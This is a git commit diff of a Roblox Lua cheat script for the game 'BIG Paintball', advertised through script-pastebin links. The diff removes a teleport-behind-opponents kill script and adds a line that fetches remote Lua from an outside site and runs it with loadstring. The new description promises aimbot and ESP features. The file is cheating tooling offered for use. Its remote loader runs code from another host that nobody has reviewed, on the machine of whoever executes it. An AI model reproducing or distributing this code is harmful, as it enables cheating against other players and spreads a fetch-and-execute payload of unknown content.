12c38db02d234c9f8fe4833ae59182bfd88df3d3
PapaJoeX <jaouad.kassaoui@gmail.com>
2022-12-25 07:28:25 +0100

    commit zero

--- LINK GAME Script pastebin roblox BIG Paintball .lua
+++ LINK GAME Script pastebin roblox BIG Paintball .lua
@@ -1,11 +1,11 @@
 -- find more powerfull verified and New Scripts here : https://script-pastebin.com
 
-local on = true  local plrs = game:GetService("Players") local lp = plrs.LocalPlayer local lpname = lp.Name       game:GetService("StarterGui"):SetCore("SendNotification", {         Title = "Controls";         Text = "i to toggle. By ScriptX#3145";     })   lp:GetMouse().KeyDown:Connect(function(key) 	if key == "i" then 		if on then 			on = false     game:GetService("StarterGui"):SetCore("SendNotification", {         Title = "Toggled Off"; 		Text = "";     }) 		else 			on = true     game:GetService("StarterGui"):SetCore("SendNotification", {         Title = "Toggled On"; 		Text = "";     }) 		end 	end end)  while wait() do for i,v in pairs(plrs:GetChildren()) do 	if v.Name ~= lpname then  	if v.Team == nil or v.Team ~= lp.Team then 			repeat wait() 			local check = false 			local check2 = false 			local spawned = false 			local check = game.Workspace:FindFirstChild(v.Name) 			if check ~= nil then check2 = check:FindFirstChild("HumanoidRootPart") end 			if check2 ~= nil then spawned = v:FindFirstChild("__SPAWNED") end  				if on and spawned ~= nil then 					game.Workspace:WaitForChild(lpname):WaitForChild("HumanoidRootPart").CFrame = game.Workspace:WaitForChild(v.Name):WaitForChild("HumanoidRootPart").CFrame + game.Workspace:WaitForChild(v.Name):WaitForChild("HumanoidRootPart").CFrame.lookVector * -2 + game.Workspace:WaitForChild(v.Name):WaitForChild("HumanoidRootPart").CFrame.upVector * 1.6 				end 			until game.Workspace:WaitForChild(v.Name):WaitForChild("Humanoid").Health == 0 	end 	end end end
+loadstring(game:HttpGet('http://www.beemoscripts.com/FlinchHub/Loader.lua'))();
 
 -- find more powerfull verified and New Scripts here : https://scriptpastebin.io
 
 --[[ Script Description:
 
-							This script makes TP to players and you can kill them very easily!
+							The script on the AIM, ESP, other!
 						
 ]]
